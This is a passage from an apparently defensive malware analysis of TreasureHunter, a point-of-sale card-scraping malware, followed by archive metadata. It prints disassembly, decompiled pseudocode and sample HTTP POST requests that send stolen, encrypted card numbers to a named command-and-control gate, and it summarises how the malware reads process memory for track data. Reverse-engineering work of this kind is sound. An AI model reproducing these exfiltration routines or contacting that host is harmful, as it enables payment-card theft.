harcoded in the binary and the domain is still online and working.\n```\n|      0x004014af   bb58fd4000   mov ebx,\nstr.x0000m.net_test_local_gate.php ; \"x0000m.net/test/local/gate.php\" @ 0x40fd58\n\n The index page of the website has the following title : \"Mosad - Build by Redo\". We get a 404 if we try to display the gate.php page in our browser, but it still responds to proper malware requests.\n\n First, the malware tries to contact its harcoded gate (x0000m.net) with the following request :\n\n```\n\n-----\n\n```\nPOST /test/local/gate.php?request true HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n[...]\nrequest=1a527a9738bdf2&use=J8DfbsnQabc730OkDqaDmaC&id=a18948d649742114cb84de349fe6f1d0\n1a527a9738bdf2 is the encrypted value of \"GET_KEYS\", J8DfbsnQabc730OkDqaDmaC is\n\n#### an hardcoded value, probably a campaign identifier, and a18948d649742114cb84de349fe6f1d0 is the product id. associated with the infected machine.\n\n The associated function starts @ 0x00401440 :\n\n```\n\n-----\n\n```\n                             .\n---------------------------------.\n                             | 0x401867 ;[g]      \n|\n                             | push 0          \n|\n                             | push 0          \n|\n                             | push 0          \n|\n                             | push 0          \n|\n                             | push ecx         \n|\n                             |  ; \"POST\" @ 0x410078  \n|\n                             | push str.POST ; str.POST \n|\n                             | push edi         \n|\n                             | sub esi, edx       \n|\n                             |  ;\nsym.imp.WINHTTP.dll_WinHttpOpenRequest        |\n                             | call dword\n[sym.imp.WINHTTP.dll_WinHttpOpenRequest] ;[d] |\n                             | push dword [ebp local_4h]                |\n                             | mov edi, eax       \n|\n                             | call\nsub.KERNEL32.dll_HeapFree_bdf ;[e]          |\n                             | add esp, 4        \n|\n                             | test edi, edi      \n|\n                             | jne 0x401897 ;[f]    \n|\n                             `----------------------------------------------------------'\n                                t f\n   .---------------------------------------------------------' '----------------------------------------------------.\n   |                                       \n|\n   |                                       \n|\n.----------------------------------------------------------------------------------------------------------------.   |\n| 0x401897 ;[f]                                   \n|   |\n| push 0x20000000                                  \n|   |\n|  ; '/'                                      \n|   |\n\n```\n\n-----\n\n```\n|  ; /                                      \n|   |\n| push 0x2f                                     \n|   |\n|  ; \"Content-Type: application/x-www-form-urlencoded\" @ 0x410088         \n|   |\n| push str.Content_Type:_application_x_www_form_urlencoded ;\nstr.Content_Type:_application_x_www_form_urlencoded |   |\n| push edi                                      \n|   |\n|  ; \"$..\" @ 0x40c194                               \n|   |\n| call dword [sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders] ;[i]           \n|   |\n| test eax, eax                                   \n|   |\n| je 0x40188f ;[h]                                  \n|   |\n`----------------------------------------------------------------------------------------------------------------'   |\n    f t                                     \n|\n    '--------------------------.-----------------------------------------------------------------------------.   |\n                  |                         \n|   |\n                  |                         \n|   |\n              .----------------------------------------------------------.             |   |\n              | 0x4018ae ;[k]                     \n|             |   |\n              | push 0                         \n|             |   |\n              | push esi                        \n|             |   |\n              | push esi                        \n|             |   |\n              | push dword [ebp + arg_8h]                \n|             |   |\n              | push 0                         \n|             |   |\n              | push 0                         \n|             |   |\n              | push edi                        \n|             |   |\n              |  ; sym.imp.WINHTTP.dll_WinHttpSendRequest       \n|             |   |\n              | call dword [sym.imp.WINHTTP.dll_WinHttpSendRequest] ;[j]\n|             |   |\n              | test eax, eax                      \n|             |   |\n              | je 0x40188f ;[h]                    \n|             |   |\n              `--------------------------------------------------------\n```\n\n-----\n\n```\n               |   |\n                  f t                        \n|   |\n                 .-' '---------------------------------------------------------------------.   |   |\n                 |                          \n|   |   |\n                 |                          \n|   |   |\n             .--------------------------------------------------------------.         |   |   |\n             | 0x4018c4 ;[m]                      \n|         |   |   |\n             | push 0                          \n|         |   |   |\n             | push edi                         \n|         |   |   |\n             |  ; UINT uExitCode                    \n|         |   |   |\n             |  ; \"z..\" @ 0x40c184                   \n|         |   |   |\n             | call dword [sym.imp.WINHTTP.dll_WinHttpReceiveResponse] ;\n[l] |         |   |   |\n             | test eax, eax                       \n|         |   |   |\n             | je 0x40188f ;[h]                     \n|         |   |   |\n             `--------------------------------------------------------------'         |   |   |\n                 f t                         \n|   |   |\n                 '-.--------------------------------------------------------------. .-.----'-----'-----'\n                  |                         \n| | |\n                  |                         \n| | |\n              .----------------------------------------------------------.   .--------------------.\n              | 0x4018d1 ;[p]                     \n|   | 0x40188f ;[h]   |\n              |   ; [0xc:4]=0xffff                  \n|   | pop edi      |\n              | mov edx, dword [ebp + arg_ch]              \n|   | xor eax, eax    |\n              | mov ecx, edi                      \n|   | pop esi      |\n              | call sub.KERNEL32.dll_ExitProcess_710 ;[n]       \n|   | mov esp, ebp    |\n              | push edi                        \n|   | pop ebp      |\n              | mov esi, eax                      \n|   | ret        |\n              |  ; sym.imp.WINHTTP.dll_WinHttpCloseHandle       \n|   `--------------------'\n\n```\n\n-----\n\n```\n              | call dword [sym.imp.WINHTTP.dll_WinHttpCloseHandle] ;[o]\n|\n              | pop edi                         \n|\n              | mov eax, esi                      \n|\n              | pop esi                         \n|\n              | mov esp, ebp                      \n|\n              | pop ebp                         \n|\n              | ret                           \n|\n              `----------------------------------------------------------'\n\n#### Then, if the amount of PANs found is equal to 0 or >= 50 (value from config), the thread sleeps for 60 seconds (hardcoded value). If it found more than 50 credentials, a POST request is prepared in build_request @ 0x004035A0 to periodically send encrypted PANs to the gate :\nPOST /test/local/gate.php?request=true HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n[...]\nreport=[Encrypted PANs]&id=a18948d649742114cb84de349fe6f1d0\n\n PANs are encrypted with the function @ 0x00402490. Finally, the thread sleeps for 180 seconds (value from config), and starts over. Partial pseudocode of the thread_send_PAN routine @ 0x00402AD0\n\n```\n\n-----\n\n```\nvoid __stdcall __noreturn thread_send_PAN(LPVOID lpThreadParameter)\n{\n while ( 1 )\n {\n  EnterCriticalSection(&CriticalSection);\n  v1 = dwNbPans;\n  if ( dwNbPans > 0 )\n   {\n   [...]\n   strPAN = sub_402680(v3, (const char *)v57);\n   encrypted_PAN = encrypt_str(strPAN, (const char *)dwKey, 0, 1);\n   v37 = (char *)lpOptional;\n   v38 = 2 * v54;\n   *(_DWORD *)lpOptional = 'oper';\n   *((_WORD *)lpOptional + 2) = 'tr';\n   *((_BYTE *)lpOptional + 6) = '=';\n   if ( 2 * v54 > 0 )\n   {\n    memmove((char *)lpOptional + 7, encrypted_PAN, v38);\n    v37 = (char *)lpOptional;\n   }\n   *(_DWORD *)&v37[v38 + 7] = '=di&';\n   v39 = (int)&v37[v38];\n   v40 = lpName;\n   v41 = 0;\n   do\n   {\n    *(_BYTE *)(v41 + v39 + 11) = v40[v41];\n    ++v41;\n   }\n   while ( v41 < '!' );\n   v42 = send_request(hConnect, dwRepTrue, lpOptional, 7u);\n   v43 = (char *)v42;\n   if ( v42 && strstr(v42, \"success\") && bDebug == 1 )\n    MessageBoxW(0, L\"successfully sent the dumps!\", L\"Debug Message\", 0);\n   free((void *)strPAN);\n   free(encrypted_PAN);\n   free(v43);\n   dwNbPans = 0;\n  }\n  LeaveCriticalSection(&CriticalSection);\n  Sleep(dw180000_0);\n\n## Recap of TreasureHunter execution flow\n\n#### Here is a small r2 script you can load (-i script.r2) to rename interesting functions with more informative names :\n\n```\n\n-----\n\n```\nafn check_luhn @ 0x00403040\nafn check_pattern @ 0x004031d0\nafn check_service_codes @ 0x00403040\nafn parse_track1 @ 0x00403280\nafn parse_track2 @ 0x00403320\nafn check_pan @ 0x004033a0\nafn to_int @ 0x00401260\nafn send_request @ 0x00401840\nafn derivate_from_productid @ 0x00401F10\nafn create_file @ 0x004021A0\nafn copy_file @ 0x00402380\nafn decrypt_arg @ 0x004023F0\nafn encrypt_str @ 0x00402490\nafn check_format_b @ 0x00403140\nafn build_request @ 0x004035A0\nafn search_process_mem @ 0x004038A0\nafn search_process @ 0x00403BD0\naf @ 0x00403DB0; afn clingfish @ 0x00403DB0\nafn copy_to_appdata @ 0x00404120\nafn init_malware @ 0x004045F0\nafn check_number_PAN @ 0x004028C0\naf @ 0x00402AD0; afn thread_send_pan @ 0x00402AD0\n\n#### Summary of the malware MO :\n\n 0x0040523B, start\n Checks PE header and gets environment strings 0x004045F0, init_malware\n Creates mutex derivated from the system's product ID (or from a hardcoded value) Copies to %APPDATA%, starts new process with encrypted path to the old one as a parameter New process decrypts the command line argument and deletes original file Tries to elevate itself to get Debug privileges Tries to reach the CnC gate 0x00401440, load_config Waits for 10 minutes (value in config) 0x00403BD0, search_process\n Lists all running processes and reads their memory 0x004038A0, search_process_mem\n Reads process memory and searches for PAN 0x004033A0, check_pan\n Looks for PAN track1 / track2 parsing in memory 0x00403280, parse_track1 0x00403320, parse_track2 0x00403040, check_luhn 0x00401840, send_request\n\n```\n\n-----\n\n#### Here are some function calls to give you an idea of the malware s call flow :\n```\n[0x004038a0]> s search_process_mem\n[0x004038a0]> pds\n0x004038a8 call fcn.0040a0f0\n0x004038ad \"N.@....D.#A\"\n0x004038d1 call dword [sym.imp.KERNEL32.dll_VirtualQueryEx]\n0x0040393b call dword [sym.imp.KERNEL32.dll_ReadProcessMemory] \"...\"\n0x00403985 call check_pan\n[0x004033a0]> pds\n0x004033fb call parse_track2\n0x00403417 call parse_track1\n0x00403433 call sub.KERNEL32.dll_EnterCriticalSection_8c0\n[0x004033a0]> s parse_track2\n[0x00403320]> pds\n0x00403331 call check_luhn\n0x00403352 call check_format_b\n0x00403363 call check_pattern\n0x00403377 call fcn.00403250\n[0x00403280]> pds\n0x0040328e call check_luhn\n0x004032d8 call check_format_b\n0x004032e9 call check_pattern\n0x004032fa call fcn.00403250\n[0x00403280]> pds\n0x0040328e call check_luhn\n0x004032d8 call check_format_b\n0x004032e9 call check_pattern\n0x004032fa call fcn.00403250\n[0x00403140]> s check_pattern\n[0x004031d0]> pds\n0x00403209 call check_service_codes\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-02-26 - TreasureHunter - A POS Malware Case Study.pdf"
    ],
    "report_names": [
        "2017-02-26 - TreasureHunter - A POS Malware Case Study.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535769,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1653693419,
    "ts_modification_date": 1653693419,
    "files": {
        "pdf": "https://archive.orkl.eu/6728a4a4dbf01ab098c9e55c1815868be1b915ef.pdf",
        "text": "https://archive.orkl.eu/6728a4a4dbf01ab098c9e55c1815868be1b915ef.txt",
        "img": "https://archive.orkl.eu/6728a4a4dbf01ab098c9e55c1815868be1b915ef.jpg"
    }
}